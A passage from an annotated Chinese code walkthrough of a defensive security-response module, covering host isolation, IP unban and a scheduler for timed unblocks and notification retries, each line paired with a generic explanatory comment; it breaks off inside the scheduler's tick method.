| 424 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 425 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        iso = self._isolation.isolate(ip, dry_run=self.dry_run)` |
| 426 | 函数调用：执行已有函数/方法完成当前步骤。 | `        self._append_memory_action(` |
| 427 | 代码语句：参与当前文件的业务流程或数据处理。 | `            {` |
| 428 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "action": "isolate_host",` |
| 429 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "source_ip": ip,` |
| 430 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "dry_run": self.dry_run,` |
| 431 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "status": "applied" if iso.success else "failed",` |
| 432 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "message": iso.message,` |
| 433 | 代码语句：参与当前文件的业务流程或数据处理。 | `            }` |
| 434 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 435 | 函数调用：执行已有函数/方法完成当前步骤。 | `        self._persist_action(` |
| 436 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            alert_id=aid,` |
| 437 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            action_type="isolate_host",` |
| 438 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            target=ip,` |
| 439 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            status="applied" if iso.success else "failed",` |
| 440 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            dry_run=self.dry_run,` |
| 441 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            error=None if iso.success else iso.message,` |
| 442 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            meta={"message": iso.message},` |
| 443 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 444 | 函数调用：执行已有函数/方法完成当前步骤。 | `        self._audit("isolate_host", ip, iso.message)` |
| 445 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 446 | 函数定义：声明 `_ban_ip` 的输入、处理逻辑和返回结果。 | `    def _ban_ip(self, ip: str, duration: timedelta) -> None:` |
| 447 | 文档字符串：说明当前模块、类或函数的职责。 | `        """兼容旧测试：单 IP 封禁入口。"""` |
| 448 | 函数调用：执行已有函数/方法完成当前步骤。 | `        self._ban_for_level(` |
| 449 | 函数调用：执行已有函数/方法完成当前步骤。 | `            DetectionResult(` |
| 450 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                threat_type="legacy_test",` |
| 451 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                threat_level="high",` |
| 452 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                confidence=1.0,` |
| 453 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                details="legacy _ban_ip",` |
| 454 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                source_ip=ip,` |
| 455 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                raw_data={},` |
| 456 | 代码语句：参与当前文件的业务流程或数据处理。 | `            ),` |
| 457 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            duration=duration,` |
| 458 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            level_label="legacy",` |
| 459 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 460 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 461 | 函数定义：声明 `_isolate_host` 的输入、处理逻辑和返回结果。 | `    def _isolate_host(self, ip: str) -> None:` |
| 462 | 文档字符串：说明当前模块、类或函数的职责。 | `        """兼容旧测试：隔离入口。"""` |
| 463 | 函数调用：执行已有函数/方法完成当前步骤。 | `        self._isolate_for_critical(` |
| 464 | 函数调用：执行已有函数/方法完成当前步骤。 | `            DetectionResult(` |
| 465 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                threat_type="legacy_test",` |
| 466 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                threat_level="critical",` |
| 467 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                confidence=1.0,` |
| 468 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                details="legacy _isolate_host",` |
| 469 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                source_ip=ip,` |
| 470 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                raw_data={},` |
| 471 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 472 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 473 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 474 | 函数定义：声明 `unban_ip` 的输入、处理逻辑和返回结果。 | `    def unban_ip(self, ip: str) -> None:` |
| 475 | 条件判断：满足条件时进入对应分支。 | `        if not validate_ip(ip):` |
| 476 | 日志记录：输出运行状态、调试信息或异常线索。 | `            logger.error("[防火墙] 无效的 IP 地址，拒绝解封: %r", ip)` |
| 477 | 返回结果：把处理后的值交回调用方。 | `            return` |
| 478 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        ip = ip.strip()` |
| 479 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        fw = self._firewall.unban_input_drop(ip, dry_run=self.dry_run)` |
| 480 | 条件判断：满足条件时进入对应分支。 | `        if not fw.ok and not self.dry_run:` |
| 481 | 日志记录：输出运行状态、调试信息或异常线索。 | `            logger.error("[防火墙] 解封失败: %s", fw.message)` |
| 482 | 函数调用：执行已有函数/方法完成当前步骤。 | `        self._banned_ips.pop(ip, None)` |
| 483 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 484 | 函数定义：声明 `execute_scheduled_unblock` 的输入、处理逻辑和返回结果。 | `    def execute_scheduled_unblock(` |
| 485 | 代码语句：参与当前文件的业务流程或数据处理。 | `        self,` |
| 486 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        ip: str,` |
| 487 | 代码语句：参与当前文件的业务流程或数据处理。 | `        *,` |
| 488 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        dry_run: bool,` |
| 489 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        alert_id: Optional[str],` |
| 490 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        schedule_task_id: int,` |
| 491 | 代码语句：参与当前文件的业务流程或数据处理。 | `    ) -> None:` |
| 492 | 条件判断：满足条件时进入对应分支。 | `        if not validate_ip(ip):` |
| 493 | 日志记录：输出运行状态、调试信息或异常线索。 | `            logger.error("[scheduler] 无效 IP，跳过解封: %r", ip)` |
| 494 | 返回结果：把处理后的值交回调用方。 | `            return` |
| 495 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        ip = ip.strip()` |
| 496 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        fw = self._firewall.unban_input_drop(ip, dry_run=dry_run)` |
| 497 | 函数调用：执行已有函数/方法完成当前步骤。 | `        self._banned_ips.pop(ip, None)` |
| 498 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        st = "applied" if fw.ok else "failed"` |
| 499 | 函数调用：执行已有函数/方法完成当前步骤。 | `        self._persist_action(` |
| 500 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            alert_id=alert_id,` |
| 501 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            action_type="unban_ip",` |
| 502 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            target=ip,` |
| 503 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            status=st,` |
| 504 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            dry_run=dry_run,` |
| 505 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            error=None if fw.ok else fw.message,` |
| 506 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            meta={"schedule_task_id": schedule_task_id, "command": fw.command},` |
| 507 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 508 | 函数调用：执行已有函数/方法完成当前步骤。 | `        self._append_memory_action(` |
| 509 | 代码语句：参与当前文件的业务流程或数据处理。 | `            {` |
| 510 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "action": "unban_ip",` |
| 511 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "source_ip": ip,` |
| 512 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "dry_run": dry_run,` |
| 513 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "status": st,` |
| 514 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "schedule_task_id": schedule_task_id,` |
| 515 | 代码语句：参与当前文件的业务流程或数据处理。 | `            }` |
| 516 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 517 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        prefix = "DRY_RUN_" if dry_run else ""` |
| 518 | 函数调用：执行已有函数/方法完成当前步骤。 | `        self._audit(` |
| 519 | 代码语句：参与当前文件的业务流程或数据处理。 | `            "unban_ip",` |
| 520 | 代码语句：参与当前文件的业务流程或数据处理。 | `            ip,` |
| 521 | 代码语句：参与当前文件的业务流程或数据处理。 | `            f"{prefix}{st}:{fw.message}",` |
| 522 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            extra={"schedule_task_id": schedule_task_id},` |
| 523 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 524 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 525 | 函数定义：声明 `execute_notify_retry` 的输入、处理逻辑和返回结果。 | `    def execute_notify_retry(` |
| 526 | 代码语句：参与当前文件的业务流程或数据处理。 | `        self,` |
| 527 | 代码语句：参与当前文件的业务流程或数据处理。 | `        *,` |
| 528 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        subject: str,` |
| 529 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        body: str,` |
| 530 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        meta: Dict[str, Any],` |
| 531 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        alert_id: Optional[str],` |
| 532 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        schedule_task_id: int,` |
| 533 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        attempt: int,` |
| 534 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        max_attempts: int,` |
| 535 | 代码语句：参与当前文件的业务流程或数据处理。 | `    ) -> bool:` |
| 536 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        attempts = self._notifier.notify_all(subject, body, meta=meta)` |
| 537 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        ok = any(a.ok for a in attempts)` |
| 538 | 函数调用：执行已有函数/方法完成当前步骤。 | `        self._persist_action(` |
| 539 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            alert_id=alert_id,` |
| 540 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            action_type="notify_retry",` |
| 541 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            target=None,` |
| 542 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            status="applied" if ok else "failed",` |
| 543 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            dry_run=self.dry_run,` |
| 544 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            error=None if ok else ";".join(x.detail for x in attempts[-3:]),` |
| 545 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            meta={` |
| 546 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "schedule_task_id": schedule_task_id,` |
| 547 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "attempt": attempt,` |
| 548 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "max_attempts": max_attempts,` |
| 549 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "attempts": [{"c": x.channel, "ok": x.ok, "d": x.detail} for x in attempts],` |
| 550 | 代码语句：参与当前文件的业务流程或数据处理。 | `            },` |
| 551 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 552 | 函数调用：执行已有函数/方法完成当前步骤。 | `        self._audit(` |
| 553 | 代码语句：参与当前文件的业务流程或数据处理。 | `            "notify_retry",` |
| 554 | 代码语句：参与当前文件的业务流程或数据处理。 | `            "",` |
| 555 | 代码语句：参与当前文件的业务流程或数据处理。 | `            "ok" if ok else "failed",` |
| 556 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            extra={"schedule_task_id": schedule_task_id},` |
| 557 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 558 | 条件判断：满足条件时进入对应分支。 | `        if not ok:` |
| 559 | 函数调用：执行已有函数/方法完成当前步骤。 | `            self._persistence.append_audit_db_event(` |
| 560 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                event_type="notify_retry_failed",` |
| 561 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                resource_id=alert_id,` |
| 562 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                payload={"schedule_task_id": schedule_task_id, "attempt": attempt},` |
| 563 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 564 | 返回结果：把处理后的值交回调用方。 | `        return ok` |
| 565 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 566 | 装饰器：为下面的函数或类附加框架行为。 | `    @property` |
| 567 | 函数定义：声明 `banned_ips` 的输入、处理逻辑和返回结果。 | `    def banned_ips(self) -> Dict[str, datetime]:` |
| 568 | 返回结果：把处理后的值交回调用方。 | `        return dict(self._banned_ips)` |
| 569 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 570 | 函数定义：声明 `is_banned` 的输入、处理逻辑和返回结果。 | `    def is_banned(self, ip: str) -> bool:` |
| 571 | 返回结果：把处理后的值交回调用方。 | `        return ip in self._banned_ips` |

## `src/response/scheduler.py`

- 类型：自动响应
- 行数：262

| 行号 | 备注 | 原始代码 |
|---:|---|---|
| 1 | 文档字符串边界：开始或结束模块/类/函数说明。 | `"""` |
| 2 | 代码语句：参与当前文件的业务流程或数据处理。 | `ResponseScheduler：定时解封、通知失败重试、任务持久化/内存降级。` |
| 3 | 文档字符串边界：开始或结束模块/类/函数说明。 | `"""` |
| 4 | 兼容性导入：启用较新的 Python 语义。 | `from __future__ import annotations` |
| 5 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 6 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import logging` |
| 7 | 导入对象：从指定模块引入类、函数或常量。 | `from datetime import datetime, timezone` |
| 8 | 导入对象：从指定模块引入类、函数或常量。 | `from typing import TYPE_CHECKING, Any, Dict, List, Optional` |
| 9 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 10 | 导入对象：从指定模块引入类、函数或常量。 | `from src.response.persistence import (` |
| 11 | 代码语句：参与当前文件的业务流程或数据处理。 | `    NullResponsePersistence,` |
| 12 | 代码语句：参与当前文件的业务流程或数据处理。 | `    ResponsePersistence,` |
| 13 | 代码语句：参与当前文件的业务流程或数据处理。 | `    ScheduleTaskRow,` |
| 14 | 函数调用：执行已有函数/方法完成当前步骤。 | `)` |
| 15 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 16 | 条件判断：满足条件时进入对应分支。 | `if TYPE_CHECKING:` |
| 17 | 导入对象：从指定模块引入类、函数或常量。 | `    from src.response.responder import SecurityResponder` |
| 18 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 19 | 日志记录：输出运行状态、调试信息或异常线索。 | `logger = logging.getLogger(__name__)` |
| 20 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 21 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `TASK_SCHEDULED_UNBLOCK = "scheduled_unblock"` |
| 22 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `TASK_NOTIFY_RETRY = "notify_retry"` |
| 23 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 24 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 25 | 类定义：声明 `ResponseScheduler`，封装相关状态与行为。 | `class ResponseScheduler:` |
| 26 | 文档字符串：说明当前模块、类或函数的职责。 | `    """当持久化为 Null 时使用进程内队列；否则读写 response_schedule_tasks 表。"""` |
| 27 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 28 | 函数定义：声明 `__init__` 的输入、处理逻辑和返回结果。 | `    def __init__(self, persistence: ResponsePersistence) -> None:` |
| 29 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._persist = persistence` |
| 30 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._mem_tasks: List[ScheduleTaskRow] = []` |
| 31 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._mem_seq = 1` |
| 32 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 33 | 函数定义：声明 `_use_memory` 的输入、处理逻辑和返回结果。 | `    def _use_memory(self) -> bool:` |
| 34 | 返回结果：把处理后的值交回调用方。 | `        return isinstance(self._persist, NullResponsePersistence)` |
| 35 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 36 | 函数定义：声明 `schedule_unblock` 的输入、处理逻辑和返回结果。 | `    def schedule_unblock(` |
| 37 | 代码语句：参与当前文件的业务流程或数据处理。 | `        self,` |
| 38 | 代码语句：参与当前文件的业务流程或数据处理。 | `        *,` |
| 39 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        ip: str,` |
| 40 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        run_at: datetime,` |
| 41 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        dry_run: bool,` |
| 42 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        alert_id: Optional[str],` |
| 43 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        related_response_action_id: Optional[int],` |
| 44 | 代码语句：参与当前文件的业务流程或数据处理。 | `    ) -> int:` |
| 45 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        payload: Dict[str, Any] = {"ip": ip, "dry_run": dry_run}` |
| 46 | 条件判断：满足条件时进入对应分支。 | `        if self._use_memory():` |
| 47 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            tid = self._mem_seq` |
| 48 | 代码语句：参与当前文件的业务流程或数据处理。 | `            self._mem_seq += 1` |
| 49 | 函数调用：执行已有函数/方法完成当前步骤。 | `            self._mem_tasks.append(` |
| 50 | 函数调用：执行已有函数/方法完成当前步骤。 | `                ScheduleTaskRow(` |
| 51 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    id=tid,` |
| 52 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    task_type=TASK_SCHEDULED_UNBLOCK,` |
| 53 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    alert_id=alert_id,` |
| 54 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    payload=payload,` |
| 55 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    run_at=run_at,` |
| 56 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    status="pending",` |
| 57 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    attempt_count=0,` |
| 58 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    max_attempts=5,` |
| 59 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    related_response_action_id=related_response_action_id,` |
| 60 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    last_error=None,` |
| 61 | 函数调用：执行已有函数/方法完成当前步骤。 | `                )` |
| 62 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 63 | 返回结果：把处理后的值交回调用方。 | `            return tid` |
| 64 | 返回结果：把处理后的值交回调用方。 | `        return self._persist.enqueue_schedule_task(` |
| 65 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            task_type=TASK_SCHEDULED_UNBLOCK,` |
| 66 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            run_at=run_at,` |
| 67 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            alert_id=alert_id,` |
| 68 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            payload=payload,` |
| 69 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            related_response_action_id=related_response_action_id,` |
| 70 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 71 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 72 | 函数定义：声明 `schedule_notify_retry` 的输入、处理逻辑和返回结果。 | `    def schedule_notify_retry(` |
| 73 | 代码语句：参与当前文件的业务流程或数据处理。 | `        self,` |
| 74 | 代码语句：参与当前文件的业务流程或数据处理。 | `        *,` |
| 75 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        run_at: datetime,` |
| 76 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        alert_id: Optional[str],` |
| 77 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        subject: str,` |
| 78 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        body: str,` |
| 79 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        meta: Dict[str, Any],` |
| 80 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        max_attempts: int = 5,` |
| 81 | 代码语句：参与当前文件的业务流程或数据处理。 | `    ) -> int:` |
| 82 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        payload = {"subject": subject, "body": body, "meta": meta}` |
| 83 | 条件判断：满足条件时进入对应分支。 | `        if self._use_memory():` |
| 84 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            tid = self._mem_seq` |
| 85 | 代码语句：参与当前文件的业务流程或数据处理。 | `            self._mem_seq += 1` |
| 86 | 函数调用：执行已有函数/方法完成当前步骤。 | `            self._mem_tasks.append(` |
| 87 | 函数调用：执行已有函数/方法完成当前步骤。 | `                ScheduleTaskRow(` |
| 88 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    id=tid,` |
| 89 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    task_type=TASK_NOTIFY_RETRY,` |
| 90 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    alert_id=alert_id,` |
| 91 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    payload=payload,` |
| 92 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    run_at=run_at,` |
| 93 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    status="pending",` |
| 94 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    attempt_count=0,` |
| 95 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    max_attempts=max_attempts,` |
| 96 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    related_response_action_id=None,` |
| 97 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    last_error=None,` |
| 98 | 函数调用：执行已有函数/方法完成当前步骤。 | `                )` |
| 99 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 100 | 返回结果：把处理后的值交回调用方。 | `            return tid` |
| 101 | 返回结果：把处理后的值交回调用方。 | `        return self._persist.enqueue_schedule_task(` |
| 102 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            task_type=TASK_NOTIFY_RETRY,` |
| 103 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            run_at=run_at,` |
| 104 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            alert_id=alert_id,` |
| 105 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            payload=payload,` |
| 106 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            max_attempts=max_attempts,` |
| 107 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 108 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 109 | 函数定义：声明 `fetch_due` 的输入、处理逻辑和返回结果。 | `    def fetch_due(self, *, before: datetime, limit: int = 50) -> List[ScheduleTaskRow]:` |
| 110 | 条件判断：满足条件时进入对应分支。 | `        if self._use_memory():` |
| 111 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            due = [t for t in self._mem_tasks if t.status == "pending" and t.run_at <= before]` |
| 112 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            due.sort(key=lambda x: x.run_at)` |
| 113 | 返回结果：把处理后的值交回调用方。 | `            return due[:limit]` |
| 114 | 返回结果：把处理后的值交回调用方。 | `        return self._persist.fetch_due_tasks(before=before, limit=limit)` |
| 115 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 116 | 函数定义：声明 `mark_running_memory` 的输入、处理逻辑和返回结果。 | `    def mark_running_memory(self, task_id: int) -> None:` |
| 117 | 条件判断：满足条件时进入对应分支。 | `        if not self._use_memory():` |
| 118 | 返回结果：把处理后的值交回调用方。 | `            return` |
| 119 | 循环：逐个处理集合或迭代器中的元素。 | `        for i, t in enumerate(self._mem_tasks):` |
| 120 | 条件判断：满足条件时进入对应分支。 | `            if t.id == task_id:` |
| 121 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                self._mem_tasks[i] = ScheduleTaskRow(` |
| 122 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    id=t.id,` |
| 123 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    task_type=t.task_type,` |
| 124 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    alert_id=t.alert_id,` |
| 125 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    payload=t.payload,` |
| 126 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    run_at=t.run_at,` |
| 127 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    status="running",` |
| 128 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    attempt_count=t.attempt_count + 1,` |
| 129 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    max_attempts=t.max_attempts,` |
| 130 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    related_response_action_id=t.related_response_action_id,` |
| 131 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    last_error=t.last_error,` |
| 132 | 函数调用：执行已有函数/方法完成当前步骤。 | `                )` |
| 133 | 跳出循环：提前结束当前循环。 | `                break` |
| 134 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 135 | 函数定义：声明 `complete_memory` 的输入、处理逻辑和返回结果。 | `    def complete_memory(self, task_id: int, *, status: str, last_error: Optional[str]) -> None:` |
| 136 | 条件判断：满足条件时进入对应分支。 | `        if not self._use_memory():` |
| 137 | 返回结果：把处理后的值交回调用方。 | `            return` |
| 138 | 循环：逐个处理集合或迭代器中的元素。 | `        for i, t in enumerate(self._mem_tasks):` |
| 139 | 条件判断：满足条件时进入对应分支。 | `            if t.id == task_id:` |
| 140 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                self._mem_tasks[i] = ScheduleTaskRow(` |
| 141 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    id=t.id,` |
| 142 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    task_type=t.task_type,` |
| 143 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    alert_id=t.alert_id,` |
| 144 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    payload=t.payload,` |
| 145 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    run_at=t.run_at,` |
| 146 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    status=status,` |
| 147 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    attempt_count=t.attempt_count,` |
| 148 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    max_attempts=t.max_attempts,` |
| 149 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    related_response_action_id=t.related_response_action_id,` |
| 150 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    last_error=last_error,` |
| 151 | 函数调用：执行已有函数/方法完成当前步骤。 | `                )` |
| 152 | 跳出循环：提前结束当前循环。 | `                break` |
| 153 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 154 | 函数定义：声明 `tick` 的输入、处理逻辑和返回结果。 | `    def tick(self, responder: "SecurityResponder", *, now: Optional[datetime] = None) -> int:` |
| 155 | 文档字符串：说明当前模块、类或函数的职责。 | `        """执行到期任务。返回本 tick 处理条数。"""` |
| 156 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        ts = now or datetime.now(timezone.utc)` |
| 157 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        due = self.fetch_due(before=ts, limit=30)` |
